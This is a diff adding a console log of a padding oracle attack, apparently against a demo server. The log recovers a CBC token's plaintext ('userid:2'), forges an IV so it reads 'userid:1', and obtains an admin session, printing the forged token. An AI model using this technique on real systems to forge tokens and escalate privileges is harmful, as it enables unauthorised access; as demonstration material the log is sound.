@@ -1,0 +1,87 @@
+Attacking remote server using parameters provided
+
+Trying to decrypt
+
+Looking at offset 15 for padding 1
+Got hit for: 49
+Got a valid decrypt for offset 15, checking edge case
+Not edge case, can continue
+There was a match
+Looking at offset 14 for padding 2
+Got hit for: 61
+There was a match
+Looking at offset 13 for padding 3
+Got hit for: 61
+There was a match
+Looking at offset 12 for padding 4
+Got hit for: 57
+There was a match
+Looking at offset 11 for padding 5
+Got hit for: 57
+There was a match
+Looking at offset 10 for padding 6
+Got hit for: 61
+There was a match
+Looking at offset 9 for padding 7
+Got hit for: 61
+There was a match
+Looking at offset 8 for padding 8
+Got hit for: 49
+There was a match
+Looking at offset 7 for padding 9
+Got hit for: 3
+There was a match
+Looking at offset 6 for padding 10
+Got hit for: 7
+There was a match
+Looking at offset 5 for padding 11
+Got hit for: 89
+There was a match
+Looking at offset 4 for padding 12
+Got hit for: 80
+There was a match
+Looking at offset 3 for padding 13
+Got hit for: 75
+There was a match
+Looking at offset 2 for padding 14
+Got hit for: 88
+There was a match
+Looking at offset 1 for padding 15
+Got hit for: 78
+There was a match
+Looking at offset 0 for padding 16
+Got hit for: 84
+There was a match
+
+Finished looping
+
+Derived IV is: 0x54 0x51 0x46 0x56 0x4c 0x42 0x1d 0x1a 0x29 0x2a 0x2b 0x2c 0x2d 0x2e 0x2f 0x20 
+Real IV is: 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 
+Zeroing array is: 0x44 0x41 0x56 0x46 0x5c 0x52 0x0d 0x0a 0x39 0x3a 0x3b 0x3c 0x3d 0x3e 0x3f 0x30 
+
+Decrypted string with padding: 0x75 0x73 0x65 0x72 0x69 0x64 0x3a 0x32 0x08 0x08 0x08 0x08 0x08 0x08 0x08 0x08 
+Decrypted string without padding: 0x75 0x73 0x65 0x72 0x69 0x64 0x3a 0x32 
+Decrypted string as text: userid:2
+
+Trying to modify string
+
+New clear text: userid:1
+New IV is: 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x3b 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 
+
+Sending new data to server...
+
+Response from server:
+array(3) {
+  ["status"]=>
+  int(200)
+  ["user"]=>
+  string(8) "Geoffery"
+  ["level"]=>
+  string(5) "admin"
+}
+
+Hack success!
+
+The new token is:
+{"token":"PhQwGVA3q+T2mT+L3Pe5Vg==","iv":"MTIzNDU2NzsxMjM0NTY3OA=="}
+
